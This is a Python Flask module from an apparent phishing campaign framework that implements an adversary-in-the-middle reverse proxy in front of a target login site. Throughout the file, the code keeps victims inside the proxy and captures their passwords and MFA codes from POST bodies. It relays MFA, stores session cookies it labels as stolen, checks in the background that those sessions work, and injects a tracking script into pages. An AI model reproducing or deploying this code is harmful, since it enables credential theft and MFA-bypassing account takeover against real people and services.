"""Proxy manager — links Flask to the proxy engine.

Mount this blueprint at /proxy/ in the main Flask app.
Requests to /proxy/<campaign_id>/<path:subpath> are proxied to
the target_url in the Campaign's flow_config.
"""

import json
import logging
from urllib.parse import urlparse

from flask import Blueprint, request, Response as FlaskResponse, abort

from .. import db
from ..models import Campaign, Recipient, Event, CapturedCookie, CapturedCredential
from .engine import get_proxy_worker, Rule
from .dumper import dump_request_response
from .plugin_loader import load_plugins as load_yaml_plugins
from .plugin_system import load_python_plugins, HTTPExchange, fire_plugin_exchange_hooks
from .cookies import parse_set_cookie_headers, parse_request_cookie_header
from .credentials import parse_post_body, extract_credentials, find_username
from .mfa_relay import prepare_relay_body
from ..utils.heatmap_js import build_heatmap_script
from ..utils.risk import recipient_risk_score, recipient_click_count
from ..utils.cookie_validation import schedule_validate_recipient_session

logger = logging.getLogger(__name__)

proxy_bp = Blueprint("proxy", __name__, url_prefix="/proxy")


def _rewrite_location(location: str, campaign_id: int) -> str:
    """Rewrite a target redirect Location header so the victim stays in the proxy.

    Relative URLs and absolute URLs are both rewritten to the proxy path.
    Already-proxied locations (starting with /proxy/) are left untouched.
    """
    if not location:
        return location

    # Avoid double-prefixing if the target already redirected through the proxy.
    if location.startswith("/proxy/"):
        return location

    parsed = urlparse(location)
    proxy_base = f"{request.url_root.rstrip('/')}/proxy/{campaign_id}/"

    if not parsed.scheme and not parsed.netloc:
        # Relative URL: /path or path
        return proxy_base + location.lstrip("/")

    # Absolute URL: keep path/query/fragment, replace host with proxy host.
    new_path = parsed.path or "/"
    new_url = proxy_base + new_path.lstrip("/")
    if parsed.query:
        new_url += "?" + parsed.query
    if parsed.fragment:
        new_url += "#" + parsed.fragment
    return new_url


def _load_rules(campaign: Campaign) -> list[Rule]:
    """Build Rule objects from the campaign's flow_config.

    YAML plugin rules are loaded first so campaign-specific inline rules can
    override or extend them.
    """
    config = campaign.get_flow_config()
    plugin_names = config.get("plugins", [])
    rules = load_yaml_plugins(plugin_names)
    rules_raw = config.get("rules", [])
    for r in rules_raw:
        try:
            rules.append(Rule(r))
        except Exception as exc:
            logger.warning("Skipping invalid inline rule for campaign %s: %s", campaign.id, exc)
    return rules


def _load_python_plugins() -> list:
    """Load Python plugins from dropoutjeep_lib/proxy/plugins_py/."""
    return load_python_plugins()


def build_context(campaign: Campaign) -> dict:
    """Build template context for rule interpolation."""
    config = campaign.get_flow_config()
    return {
        "static_prefix": config.get("static_prefix", "/proxy/static/"),
        "token": "",
        "campaign_id": campaign.id,
        "flow_config": config,
    }


def _extract_recipient_token(subpath: str) -> tuple[str | None, str]:
    """If subpath starts with 't/<token>/', return (token, remaining_path).

    Per-recipient proxy URLs look like /proxy/<id>/t/<token>/login.
    """
    if not subpath:
        return None, subpath
    parts = subpath.split("/", 2)
    if len(parts) >= 2 and parts[0] == "t" and parts[1]:
        remaining = parts[2] if len(parts) == 3 else ""
        return parts[1], remaining
    return None, subpath


def _capture_credentials(campaign: Campaign, method: str, body: bytes,
                         content_type: str | None, path: str,
                         recipient: Recipient | None = None):
    """Inspect POST bodies and persist captured credentials/MFA codes."""
    config = campaign.get_flow_config()
    if not config.get("capture_credentials") or method.upper() != "POST":
        return

    password_fields = config.get("password_field_names") or None
    mfa_fields = config.get("mfa_field_names") or None

    fields = parse_post_body(body, content_type)
    if not fields:
        return

    username = find_username(fields)
    captured = extract_credentials(fields, password_fields=password_fields, mfa_fields=mfa_fields)
    if not captured:
        return

    username_for_event = username or (recipient.email if recipient else None)

    for item in captured:
        cred = CapturedCredential(
            campaign_id=campaign.id,
            recipient_id=recipient.id if recipient else None,
            credential_type=item["type"],
            field_name=item["field"],
            username=username_for_event,
            source_path=path,
        )
        cred.set_value(item["value"])
        db.session.add(cred)

        event_type = (
            "proxy_mfa_capture" if item["type"] == "mfa" else "proxy_credential_capture"
        )
        meta = {
            "field": item["field"],
            "username": username_for_event,
            "credential_type": item["type"],
            "path": path,
        }
        db.session.add(Event(
            campaign_id=campaign.id,
            recipient_id=recipient.id if recipient else None,
            event_type=event_type,
            meta=json.dumps(meta, default=str),
        ))

    try:
        db.session.commit()
    except Exception:
        db.session.rollback()
        logger.exception("Failed to persist captured credentials for campaign %s", campaign.id)


def _capture_cookies(campaign: Campaign, request_headers: dict, response_headers: dict,
                     target_url: str, recipient_token: str | None = None,
                     response_cookie_source: str = 'response') -> list[str]:
    """Persist captured request/response cookies when enabled for the campaign.

    Returns the list of response cookie names that were persisted.
    """
    config = campaign.get_flow_config()
    response_cookie_names: list[str] = []
    if not config.get("capture_cookies"):
        return response_cookie_names

    captured = []

    # Cookies sent by the victim to the target.
    cookie_header = request_headers.get('Cookie') or request_headers.get('cookie')
    for c in parse_request_cookie_header(cookie_header):
        captured.append(CapturedCookie(
            campaign_id=campaign.id,
            recipient_token=recipient_token,
            cookie_name=c['name'],
            cookie_value=c['value'],
            cookie_domain=None,
            cookie_path=None,
            source='request',
        ))

    # Cookies the target asked the victim to store.
    for c in parse_set_cookie_headers(response_headers, target_url):
        captured.append(CapturedCookie(
            campaign_id=campaign.id,
            recipient_token=recipient_token,
            cookie_name=c['name'],
            cookie_value=c['value'],
            cookie_domain=c['domain'],
            cookie_path=c['path'],
            source=response_cookie_source,
        ))
        response_cookie_names.append(c['name'])

    if captured:
        try:
            db.session.add_all(captured)
            db.session.commit()
        except Exception:
            db.session.rollback()
            logger.exception("Failed to persist captured cookies for campaign %s", campaign.id)

    return response_cookie_names


@proxy_bp.route("/<int:campaign_id>/<path:subpath>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
def proxy_handler(campaign_id, subpath):
    """Catch-all proxy handler for a specific campaign's proxy traffic."""
    campaign = Campaign.query.get(campaign_id)
    if not campaign:
        abort(404)
    if campaign.flow_type != "reverse_proxy":
        abort(400, "Campaign is not configured as a reverse proxy")

    config = campaign.get_flow_config()
    target_url = config.get("target_url", "")
    if not target_url:
        abort(500, "No target_url configured for this campaign")

    rules = _load_rules(campaign)
    python_plugins = _load_python_plugins()
    ctx = build_context(campaign)

    # GAP 5/6: support per-recipient proxy URLs /proxy/<id>/t/<token>/...
    recipient_token, proxy_subpath = _extract_recipient_token(subpath)
    recipient = None
    if recipient_token:
        recipient = Recipient.query.filter_by(campaign_id=campaign.id, token=recipient_token).first()
        if recipient:
            ctx["token"] = recipient_token
            risk = recipient_risk_score(recipient.id)
            ctx["risk_score"] = risk["score"]
            ctx["risk_bucket"] = risk["bucket"]
            ctx["click_count"] = recipient_click_count(recipient.id)

    # Request context
    method = request.method
    path = "/" + proxy_subpath if proxy_subpath else "/"
    headers = dict(request.headers)
    query_params = {k: v for k, v in request.args.items() if k != "dj_token"}
    body = request.get_data()
    content_type = request.content_type

    forward_body, forward_content_type, did_mfa_relay = prepare_relay_body(
        campaign.id, recipient_token, request.remote_addr, method, path, body, content_type, config
    )
    if forward_content_type:
        headers["Content-Type"] = forward_content_type
    if did_mfa_relay or forward_body != body:
        headers["Content-Length"] = str(len(forward_body))

    upstream_proxy = config.get("upstream_proxy", "")
    worker = get_proxy_worker(
        upstream_proxy,
        config.get("tls_fingerprint"),
        config.get("renderer"),
    )
    try:
        resp = worker.handle(method, target_url, path, headers, query_params, forward_body, rules, ctx,
                             plugins=python_plugins)
    except Exception as e:
        logger.exception("Proxy error for campaign %d: %s", campaign_id, e)
        abort(502)

    # GAP 11: Rewrite target redirects so the victim stays inside the proxy.
    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get("Location")
        if location:
            resp.headers["Location"] = _rewrite_location(location, campaign_id)

    # GAP 5/6: Capture credentials/MFA codes from POST bodies.
    _capture_credentials(campaign, method, body, content_type, path, recipient=recipient)

    # GAP 7: Capture cookies flowing through the proxy.  Mark session cookies
    # stolen after a successful MFA relay so operators can find them quickly.
    cookie_source = "post_mfa" if did_mfa_relay else "response"
    captured_cookie_names = _capture_cookies(
        campaign, headers, resp.headers, target_url, recipient_token=ctx.get("token") or None,
        response_cookie_source=cookie_source,
    )

    if did_mfa_relay and captured_cookie_names:
        try:
            db.session.add(Event(
                campaign_id=campaign.id,
                recipient_id=recipient.id if recipient else None,
                event_type="proxy_session_cookie_capture",
                meta=json.dumps({
                    "recipient_token": ctx.get("token"),
                    "path": path,
                    "cookie_names": captured_cookie_names,
                }, default=str),
            ))
            db.session.commit()
        except Exception:
            db.session.rollback()
            logger.exception("Failed to persist session cookie event for campaign %s", campaign.id)

        # Validate the captured session in the background.
        schedule_validate_recipient_session(campaign.id, ctx.get("token") or None)

    rule_names = [r.url_pattern for r in rules if r.matches(path)]
    dump_request_response(
        campaign_id, method, path, headers, body.decode("utf-8", errors="replace") if body else None,
        resp.status_code, resp.headers, resp.body,
        dump_all=config.get("dump_all", False),
        matched_rule=rule_names[0] if rule_names else None,
    )

    # Inject click heatmap tracker into HTML responses.
    if not resp.passthrough and resp.body:
        content_type = (resp.headers.get('content-type') or '').lower()
        if 'text/html' in content_type or resp.body.startswith('<'):
            heatmap_script = build_heatmap_script(campaign.id, ctx.get('token'))
            if '</body>' in resp.body:
                resp.body = resp.body.replace('</body>', heatmap_script + '</body>')
            else:
                resp.body += heatmap_script

    # Build Flask response
    if resp.passthrough:
        flask_resp = FlaskResponse(resp.raw_body or b"", status=resp.status_code)
    else:
        flask_resp = FlaskResponse(resp.body, status=resp.status_code)
    for key, value in resp.headers.items():
        # Skip hop-by-hop and content-encoding (we decompressed)
        if key.lower() in ("transfer-encoding", "content-encoding", "connection", "keep-alive"):
            continue
        flask_resp.headers[key] = value

    # GAP 3/4: Fire Python plugin exchange hooks in the background.
    exchange = HTTPExchange(
        method=method,
        path=path,
        target_url=target_url,
        campaign_id=campaign_id,
        recipient_token=ctx.get("token") or None,
        request_headers=headers,
        request_body=body or b"",
        response_status=resp.status_code,
        response_headers=dict(resp.headers),
        response_body=resp.body or "",
    )
    fire_plugin_exchange_hooks(exchange, python_plugins)

    return flask_resp


@proxy_bp.route("/<int:campaign_id>/", defaults={"subpath": ""})
@proxy_bp.route("/<int:campaign_id>", defaults={"subpath": ""})
def proxy_root(campaign_id, subpath):
    return proxy_handler(campaign_id, "")
